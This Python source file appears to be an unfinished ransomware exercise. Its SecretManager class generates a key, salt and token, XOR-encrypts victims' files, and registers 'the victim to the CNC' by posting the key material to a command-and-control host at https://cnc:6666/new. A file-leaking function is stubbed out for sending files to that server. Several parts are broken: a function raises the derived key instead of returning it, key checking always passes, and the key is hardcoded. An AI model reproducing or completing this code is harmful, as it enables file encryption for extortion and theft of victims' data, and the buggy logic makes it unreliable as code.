from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import json
import base64
import secrets

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile


ITERATION = 48000
TOKEN_LENGTH = 16
SALT_LENGTH = 16
KEY_LENGTH = 16


class SecretManager:

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:
        # PBKDF2HMAC algorithm
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=KEY_LENGTH+SALT_LENGTH,
            salt=salt,
            iterations=ITERATION,
        )
        # key derivation
        dkey = kdf.derive(key)
        raise dkey


    def create(self)->Tuple[bytes, bytes, bytes]:   #??????????????????????????
        #self._key = b"I am the key"
        #self._salt = os.urandom(SALT_LENGTH),# Salts randomly generated
        #self._token = token_bytes(TOKEN_LENGTH) # Generate token
        print("#create")
        return (self._key, self._salt, self._token)


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")


    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        # register the victim to the CNC
        res = requests.post('https://cnc:6666/new', #https://httpbin.org/post  #application/json # application/json/new ?????????????
                      json={
                          "token" : self.bin_to_b64(token),
                          "salt" : self.bin_to_b64(salt),
                          "key" : self.bin_to_b64(key)
                      }
        )
        print("#post:", str(res))
        return None



    def setup(self)->None:
        # main function to create crypto data and register malware to cnc # CREATE Function ??????????
        self._key = b"I am the key"
        self._salt = os.urandom(SALT_LENGTH) # Salts randomly generated
        self._token = secrets.token_bytes(TOKEN_LENGTH) # Generate token

        print("\t"+str(self._key))
        print("\t"+str(self._salt))
        print("\t"+str(self._token))
        
        # do not create token.bin if it's already existing
        if os.path.exists(self._path+'/token.bin'):
            """with open(self._path+'/salt.bin', 'wb') as salt:
                self._salt = salt.read(SALT_LENGTH)
        
            with open(self._path+'/token.bin', 'wb') as token:
                self._token = token.read(TOKEN_LENGTH)"""
            
            return None
        
        with open(self._path+'/salt.bin', 'wb') as salt:
            salt.write(self._salt)
        
        with open(self._path+'/token.bin', 'wb') as token:
            token.write(self._token)

        #self.post_new(self._salt, self._key, self._token) #=========PROBLEMES===========

        print("#setup")
        return None
    



    def load(self)->None:
        # function to load crypto data
        raise NotImplemented()


    def check_key(self, candidate_key:bytes)->bool:
        # Assert the key is valid
        return True


    def set_key(self, b64_key:str)->None:
        # If the key is valid, set the self._key var for decrypting
        self.check_key(self, b64_key)
        self._key = b64_key
        return None


    def get_hex_token(self)->str:
        # Should return a string composed of hex symbole, regarding the token
        decoded_bytes = base64.b64decode(self._token)
        str_token = decoded_bytes.decode('utf-8')
        return str_token

    def xorfiles(self, files:List[str])->None:
        # xor a list for file
        for e in range(len(files)):
            xorfile(files[e], self._key)

        print("#xorfiles")
        return None


    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()


    def clean(self):
        # remove crypto data from the target
        raise NotImplemented()